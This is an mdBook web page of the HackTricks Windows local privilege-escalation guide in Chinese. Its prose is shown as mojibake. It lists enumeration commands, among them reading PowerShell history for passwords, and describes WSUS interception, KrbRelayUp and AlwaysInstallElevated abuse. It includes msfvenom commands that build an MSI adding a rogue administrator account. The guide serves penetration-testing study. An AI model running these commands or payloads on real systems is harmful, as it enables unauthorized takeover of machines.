<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Windows Local Privilege Escalation</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="windows-æœ¬åœ°æƒé™æå‡"><a class="header" href="#windows-æœ¬åœ°æƒé™æå‡">Windows æœ¬åœ°æƒé™æå‡</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h3 id="æŸ¥æ‰¾-windows-æœ¬åœ°æƒé™æå‡å‘é‡çš„æœ€ä½³å·¥å…·-winpeas"><a class="header" href="#æŸ¥æ‰¾-windows-æœ¬åœ°æƒé™æå‡å‘é‡çš„æœ€ä½³å·¥å…·-winpeas"><strong>æŸ¥æ‰¾ Windows æœ¬åœ°æƒé™æå‡å‘é‡çš„æœ€ä½³å·¥å…·ï¼š</strong> <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"><strong>WinPEAS</strong></a></a></h3>
<h2 id="åˆå§‹-windows-ç†è®º"><a class="header" href="#åˆå§‹-windows-ç†è®º">åˆå§‹ Windows ç†è®º</a></h2>
<h3 id="è®¿é—®ä»¤ç‰Œ"><a class="header" href="#è®¿é—®ä»¤ç‰Œ">è®¿é—®ä»¤ç‰Œ</a></h3>
<p><strong>å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ Windows è®¿é—®ä»¤ç‰Œï¼Œè¯·åœ¨ç»§ç»­ä¹‹å‰é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼š</strong></p>
<p>{% content-ref url="access-tokens.md" %}
<a href="access-tokens.html">access-tokens.md</a>
{% endcontent-ref %}</p>
<h3 id="acls---daclssaclsaces"><a class="header" href="#acls---daclssaclsaces">ACLs - DACLs/SACLs/ACEs</a></h3>
<p><strong>æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥è·å–æœ‰å…³ ACLs - DACLs/SACLs/ACEs çš„æ›´å¤šä¿¡æ¯ï¼š</strong></p>
<p>{% content-ref url="acls-dacls-sacls-aces.md" %}
<a href="acls-dacls-sacls-aces.html">acls-dacls-sacls-aces.md</a>
{% endcontent-ref %}</p>
<h3 id="å®Œæ•´æ€§çº§åˆ«"><a class="header" href="#å®Œæ•´æ€§çº§åˆ«">å®Œæ•´æ€§çº§åˆ«</a></h3>
<p><strong>å¦‚æœä½ ä¸çŸ¥é“ Windows ä¸­çš„å®Œæ•´æ€§çº§åˆ«æ˜¯ä»€ä¹ˆï¼Œä½ åº”è¯¥åœ¨ç»§ç»­ä¹‹å‰é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼š</strong></p>
<p>{% content-ref url="integrity-levels.md" %}
<a href="integrity-levels.html">integrity-levels.md</a>
{% endcontent-ref %}</p>
<h2 id="windows-å®‰å…¨æ§åˆ¶"><a class="header" href="#windows-å®‰å…¨æ§åˆ¶">Windows å®‰å…¨æ§åˆ¶</a></h2>
<p>Windows ä¸­æœ‰ä¸åŒçš„å†…å®¹å¯èƒ½ä¼š <strong>é˜»æ­¢ä½ æšä¸¾ç³»ç»Ÿ</strong>ã€è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶æˆ–ç”šè‡³ <strong>æ£€æµ‹ä½ çš„æ´»åŠ¨</strong>ã€‚ä½ åº”è¯¥ <strong>é˜…è¯»</strong> ä»¥ä¸‹ <strong>é¡µé¢</strong> å¹¶ <strong>æšä¸¾</strong> æ‰€æœ‰è¿™äº› <strong>é˜²å¾¡</strong> <strong>æœºåˆ¶</strong>ï¼Œç„¶åå†å¼€å§‹æƒé™æå‡æšä¸¾ï¼š</p>
<p>{% content-ref url="../authentication-credentials-uac-and-efs/" %}
<a href="../authentication-credentials-uac-and-efs/">authentication-credentials-uac-and-efs</a>
{% endcontent-ref %}</p>
<h2 id="ç³»ç»Ÿä¿¡æ¯"><a class="header" href="#ç³»ç»Ÿä¿¡æ¯">ç³»ç»Ÿä¿¡æ¯</a></h2>
<h3 id="ç‰ˆæœ¬ä¿¡æ¯æšä¸¾"><a class="header" href="#ç‰ˆæœ¬ä¿¡æ¯æšä¸¾">ç‰ˆæœ¬ä¿¡æ¯æšä¸¾</a></h3>
<p>æ£€æŸ¥ Windows ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨å·²çŸ¥æ¼æ´ï¼ˆåŒæ—¶æ£€æŸ¥å·²åº”ç”¨çš„è¡¥ä¸ï¼‰ã€‚</p>
<pre><code class="language-bash">systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
</code></pre>
<pre><code class="language-bash">[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
</code></pre>
<h3 id="ç‰ˆæœ¬æ¼æ´"><a class="header" href="#ç‰ˆæœ¬æ¼æ´">ç‰ˆæœ¬æ¼æ´</a></h3>
<p>è¿™ä¸ª <a href="https://msrc.microsoft.com/update-guide/vulnerability">ç½‘ç«™</a> å¯¹äºæœç´¢æœ‰å…³ Microsoft å®‰å…¨æ¼æ´çš„è¯¦ç»†ä¿¡æ¯éå¸¸æœ‰ç”¨ã€‚è¿™ä¸ªæ•°æ®åº“åŒ…å«è¶…è¿‡ 4,700 ä¸ªå®‰å…¨æ¼æ´ï¼Œæ˜¾ç¤ºäº† Windows ç¯å¢ƒæ‰€å‘ˆç°çš„ <strong>åºå¤§æ”»å‡»é¢</strong>ã€‚</p>
<p><strong>åœ¨ç³»ç»Ÿä¸Š</strong></p>
<ul>
<li><em>post/windows/gather/enum_patches</em></li>
<li><em>post/multi/recon/local_exploit_suggester</em></li>
<li><a href="https://github.com/rasta-mouse/Watson"><em>watson</em></a></li>
<li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"><em>winpeas</em></a> <em>(Winpeas å·²åµŒå…¥ watson)</em></li>
</ul>
<p><strong>ä½¿ç”¨ç³»ç»Ÿä¿¡æ¯æœ¬åœ°</strong></p>
<ul>
<li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
<li><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></li>
</ul>
<p><strong>æ¼æ´çš„ Github ä»“åº“ï¼š</strong></p>
<ul>
<li><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></li>
<li><a href="https://github.com/abatchy17/WindowsExploits">https://github.com/abatchy17/WindowsExploits</a></li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
</ul>
<h3 id="ç¯å¢ƒ"><a class="header" href="#ç¯å¢ƒ">ç¯å¢ƒ</a></h3>
<p>ç¯å¢ƒå˜é‡ä¸­æ˜¯å¦ä¿å­˜äº†ä»»ä½•å‡­æ®/æ•æ„Ÿä¿¡æ¯ï¼Ÿ</p>
<pre><code class="language-bash">set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
</code></pre>
<h3 id="powershell-å†å²"><a class="header" href="#powershell-å†å²">PowerShell å†å²</a></h3>
<pre><code class="language-bash">ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
</code></pre>
<h3 id="powershell-è½¬å½•æ–‡ä»¶"><a class="header" href="#powershell-è½¬å½•æ–‡ä»¶">PowerShell è½¬å½•æ–‡ä»¶</a></h3>
<p>æ‚¨å¯ä»¥åœ¨ <a href="https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/">https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/</a> å­¦ä¹ å¦‚ä½•å¯ç”¨æ­¤åŠŸèƒ½ã€‚</p>
<pre><code class="language-bash">#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
</code></pre>
<h3 id="powershell-æ¨¡å—æ—¥å¿—è®°å½•"><a class="header" href="#powershell-æ¨¡å—æ—¥å¿—è®°å½•">PowerShell æ¨¡å—æ—¥å¿—è®°å½•</a></h3>
<p>PowerShell ç®¡é“æ‰§è¡Œçš„è¯¦ç»†ä¿¡æ¯è¢«è®°å½•ï¼ŒåŒ…æ‹¬æ‰§è¡Œçš„å‘½ä»¤ã€å‘½ä»¤è°ƒç”¨å’Œè„šæœ¬çš„éƒ¨åˆ†å†…å®¹ã€‚ç„¶è€Œï¼Œå®Œæ•´çš„æ‰§è¡Œç»†èŠ‚å’Œè¾“å‡ºç»“æœå¯èƒ½ä¸ä¼šè¢«æ•è·ã€‚</p>
<p>è¦å¯ç”¨æ­¤åŠŸèƒ½ï¼Œè¯·æŒ‰ç…§æ–‡æ¡£ä¸­â€œè½¬å½•æ–‡ä»¶â€éƒ¨åˆ†çš„è¯´æ˜æ“ä½œï¼Œé€‰æ‹© <strong>"æ¨¡å—æ—¥å¿—è®°å½•"</strong> è€Œä¸æ˜¯ <strong>"Powershell è½¬å½•"</strong>ã€‚</p>
<pre><code class="language-bash">reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
</code></pre>
<p>è¦æŸ¥çœ‹PowersShellæ—¥å¿—ä¸­çš„æœ€å15ä¸ªäº‹ä»¶ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š</p>
<pre><code class="language-bash">Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
</code></pre>
<h3 id="powershell-è„šæœ¬å—æ—¥å¿—è®°å½•"><a class="header" href="#powershell-è„šæœ¬å—æ—¥å¿—è®°å½•">PowerShell <strong>è„šæœ¬å—æ—¥å¿—è®°å½•</strong></a></h3>
<p>è„šæœ¬æ‰§è¡Œçš„å®Œæ•´æ´»åŠ¨å’Œå…¨éƒ¨å†…å®¹è®°å½•è¢«æ•è·ï¼Œç¡®ä¿æ¯ä¸ªä»£ç å—åœ¨è¿è¡Œæ—¶éƒ½è¢«è®°å½•ã€‚è¿™ä¸ªè¿‡ç¨‹ä¿ç•™äº†æ¯ä¸ªæ´»åŠ¨çš„å…¨é¢å®¡è®¡è½¨è¿¹ï¼Œå¯¹äºå–è¯å’Œåˆ†ææ¶æ„è¡Œä¸ºéå¸¸æœ‰ä»·å€¼ã€‚é€šè¿‡åœ¨æ‰§è¡Œæ—¶è®°å½•æ‰€æœ‰æ´»åŠ¨ï¼Œæä¾›äº†å¯¹è¯¥è¿‡ç¨‹çš„è¯¦ç»†æ´å¯Ÿã€‚</p>
<pre><code class="language-bash">reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
</code></pre>
<p>æ—¥å¿—äº‹ä»¶å¯ä»¥åœ¨ Windows äº‹ä»¶æŸ¥çœ‹å™¨ä¸­æ‰¾åˆ°ï¼Œè·¯å¾„ä¸ºï¼š<strong>åº”ç”¨ç¨‹åºå’ŒæœåŠ¡æ—¥å¿— &gt; Microsoft &gt; Windows &gt; PowerShell &gt; æ“ä½œ</strong>ã€‚<br />
è¦æŸ¥çœ‹æœ€å 20 ä¸ªäº‹ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p>
<pre><code class="language-bash">Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
</code></pre>
<h3 id="äº’è”ç½‘è®¾ç½®"><a class="header" href="#äº’è”ç½‘è®¾ç½®">äº’è”ç½‘è®¾ç½®</a></h3>
<pre><code class="language-bash">reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
</code></pre>
<h3 id="é©±åŠ¨å™¨"><a class="header" href="#é©±åŠ¨å™¨">é©±åŠ¨å™¨</a></h3>
<pre><code class="language-bash">wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
</code></pre>
<h2 id="wsus"><a class="header" href="#wsus">WSUS</a></h2>
<p>å¦‚æœæ›´æ–°ä¸æ˜¯é€šè¿‡ http<strong>S</strong> è€Œæ˜¯é€šè¿‡ http è¯·æ±‚çš„ï¼Œæ‚¨å¯ä»¥å±å®³ç³»ç»Ÿã€‚</p>
<p>æ‚¨å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ç½‘ç»œæ˜¯å¦ä½¿ç”¨é SSL WSUS æ›´æ–°ï¼š</p>
<pre><code>reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
</code></pre>
<p>å¦‚æœä½ æ”¶åˆ°è¿™æ ·çš„å›å¤ï¼š</p>
<pre><code class="language-bash">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
</code></pre>
<p>å¦‚æœ <code>HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer</code> ç­‰äº <code>1</code>ã€‚</p>
<p>é‚£ä¹ˆï¼Œ<strong>å®ƒæ˜¯å¯åˆ©ç”¨çš„ã€‚</strong> å¦‚æœæœ€åä¸€ä¸ªæ³¨å†Œè¡¨ç­‰äº 0ï¼Œåˆ™ WSUS æ¡ç›®å°†è¢«å¿½ç•¥ã€‚</p>
<p>ä¸ºäº†åˆ©ç”¨è¿™äº›æ¼æ´ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·å¦‚ï¼š<a href="https://github.com/pimps/wsuxploit">Wsuxploit</a>ã€<a href="https://github.com/GoSecure/pywsus">pyWSUS </a> - è¿™äº›æ˜¯ MiTM æ­¦å™¨åŒ–çš„åˆ©ç”¨è„šæœ¬ï¼Œç”¨äºå°†â€œå‡â€æ›´æ–°æ³¨å…¥é SSL WSUS æµé‡ä¸­ã€‚</p>
<p>åœ¨è¿™é‡Œé˜…è¯»ç ”ç©¶ï¼š</p>
<p>{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}</p>
<p><strong>WSUS CVE-2020-1013</strong></p>
<p><a href="https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/"><strong>åœ¨è¿™é‡Œé˜…è¯»å®Œæ•´æŠ¥å‘Š</strong></a>ã€‚<br />
åŸºæœ¬ä¸Šï¼Œè¿™æ˜¯è¿™ä¸ªæ¼æ´åˆ©ç”¨çš„ç¼ºé™·ï¼š</p>
<blockquote>
<p>å¦‚æœæˆ‘ä»¬æœ‰æƒä¿®æ”¹æœ¬åœ°ç”¨æˆ·ä»£ç†ï¼Œå¹¶ä¸” Windows æ›´æ–°ä½¿ç”¨ Internet Explorer è®¾ç½®ä¸­é…ç½®çš„ä»£ç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰æƒåœ¨æœ¬åœ°è¿è¡Œ <a href="https://github.com/GoSecure/pywsus">PyWSUS</a> æ¥æ‹¦æˆªæˆ‘ä»¬è‡ªå·±çš„æµé‡ï¼Œå¹¶ä»¥æå‡çš„ç”¨æˆ·èº«ä»½åœ¨æˆ‘ä»¬çš„èµ„äº§ä¸Šè¿è¡Œä»£ç ã€‚</p>
<p>æ­¤å¤–ï¼Œç”±äº WSUS æœåŠ¡ä½¿ç”¨å½“å‰ç”¨æˆ·çš„è®¾ç½®ï¼Œå®ƒè¿˜å°†ä½¿ç”¨å…¶è¯ä¹¦å­˜å‚¨ã€‚å¦‚æœæˆ‘ä»¬ä¸º WSUS ä¸»æœºåç”Ÿæˆè‡ªç­¾åè¯ä¹¦å¹¶å°†æ­¤è¯ä¹¦æ·»åŠ åˆ°å½“å‰ç”¨æˆ·çš„è¯ä¹¦å­˜å‚¨ä¸­ï¼Œæˆ‘ä»¬å°†èƒ½å¤Ÿæ‹¦æˆª HTTP å’Œ HTTPS WSUS æµé‡ã€‚WSUS ä¸ä½¿ç”¨ HSTS ç±»ä¼¼æœºåˆ¶åœ¨è¯ä¹¦ä¸Šå®ç°é¦–æ¬¡ä½¿ç”¨ä¿¡ä»»ç±»å‹çš„éªŒè¯ã€‚å¦‚æœæ‰€å‘ˆç°çš„è¯ä¹¦è¢«ç”¨æˆ·ä¿¡ä»»å¹¶å…·æœ‰æ­£ç¡®çš„ä¸»æœºåï¼ŒæœåŠ¡å°†æ¥å—å®ƒã€‚</p>
</blockquote>
<p>æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…· <a href="https://github.com/GoSecure/wsuspicious"><strong>WSUSpicious</strong></a> åˆ©ç”¨æ­¤æ¼æ´ï¼ˆè§£æ”¾åï¼‰ã€‚</p>
<h2 id="krbrelayup"><a class="header" href="#krbrelayup">KrbRelayUp</a></h2>
<p>åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼ŒWindows <strong>åŸŸ</strong>ç¯å¢ƒä¸­å­˜åœ¨ <strong>æœ¬åœ°æƒé™æå‡</strong> æ¼æ´ã€‚è¿™äº›æ¡ä»¶åŒ…æ‹¬ <strong>LDAP ç­¾åæœªå¼ºåˆ¶æ‰§è¡Œ</strong>ã€ç”¨æˆ·æ‹¥æœ‰è‡ªæˆ‘æƒé™å…è®¸ä»–ä»¬é…ç½® <strong>åŸºäºèµ„æºçš„å—é™å§”æ´¾ (RBCD)</strong>ï¼Œä»¥åŠç”¨æˆ·åœ¨åŸŸå†…åˆ›å»ºè®¡ç®—æœºçš„èƒ½åŠ›ã€‚é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œè¿™äº› <strong>è¦æ±‚</strong> åœ¨ <strong>é»˜è®¤è®¾ç½®</strong> ä¸‹æ»¡è¶³ã€‚</p>
<p>åœ¨ <a href="https://github.com/Dec0ne/KrbRelayUp"><strong>https://github.com/Dec0ne/KrbRelayUp</strong></a> ä¸­æ‰¾åˆ° <strong>åˆ©ç”¨</strong>ã€‚</p>
<p>æœ‰å…³æ”»å‡»æµç¨‹çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ <a href="https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/">https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/</a></p>
<h2 id="alwaysinstallelevated"><a class="header" href="#alwaysinstallelevated">AlwaysInstallElevated</a></h2>
<p><strong>å¦‚æœ</strong> è¿™ 2 ä¸ªæ³¨å†Œè¡¨ <strong>å¯ç”¨</strong>ï¼ˆå€¼ä¸º <strong>0x1</strong>ï¼‰ï¼Œåˆ™ä»»ä½•æƒé™çš„ç”¨æˆ·éƒ½å¯ä»¥ <strong>å®‰è£…</strong>ï¼ˆæ‰§è¡Œï¼‰ <code>*.msi</code> æ–‡ä»¶ä½œä¸º NT AUTHORITY\<strong>SYSTEM</strong>ã€‚</p>
<pre><code class="language-bash">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</code></pre>
<h3 id="metasploit-è½½è·"><a class="header" href="#metasploit-è½½è·">Metasploit è½½è·</a></h3>
<pre><code class="language-bash">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
</code></pre>
<p>å¦‚æœæ‚¨æœ‰ä¸€ä¸ª meterpreter ä¼šè¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ¨¡å— <strong><code>exploit/windows/local/always_install_elevated</code></strong> è‡ªåŠ¨åŒ–æ­¤æŠ€æœ¯ã€‚</p>
<h3 id="powerup"><a class="header" href="#powerup">PowerUP</a></h3>
<p>ä½¿ç”¨ power-up ä¸­çš„ <code>Write-UserAddMSI</code> å‘½ä»¤åœ¨å½“å‰ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ª Windows MSI äºŒè¿›åˆ¶æ–‡ä»¶ä»¥æå‡æƒé™ã€‚æ­¤è„šæœ¬å†™å‡ºä¸€ä¸ªé¢„ç¼–è¯‘çš„ MSI å®‰è£…ç¨‹åºï¼Œè¯¥ç¨‹åºæç¤ºæ·»åŠ ç”¨æˆ·/ç»„ï¼ˆå› æ­¤æ‚¨éœ€è¦ GIU è®¿é—®æƒé™ï¼‰ï¼š</p>
<pre><code>Write-UserAddMSI
</code></pre>
<p>åªéœ€æ‰§è¡Œåˆ›å»ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ä»¥æå‡æƒé™ã€‚</p>
<h3 id="msi-wrapper"><a class="header" href="#msi-wrapper">MSI Wrapper</a></h3>
<p>é˜…è¯»æœ¬æ•™ç¨‹ä»¥äº†è§£å¦‚ä½•ä½¿ç”¨è¿™äº›å·¥å…·åˆ›å»º MSI åŒ…è£…å™¨ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨<strong>ä»…</strong>æƒ³è¦<strong>æ‰§è¡Œ</strong> <strong>å‘½ä»¤è¡Œ</strong>ï¼Œå¯ä»¥åŒ…è£…ä¸€ä¸ª "<strong>.bat</strong>" æ–‡ä»¶ã€‚</p>
<p>{% content-ref url="msi-wrapper.md" %}
<a href="msi-wrapper.html">msi-wrapper.md</a>
{% endcontent-ref %}</p>
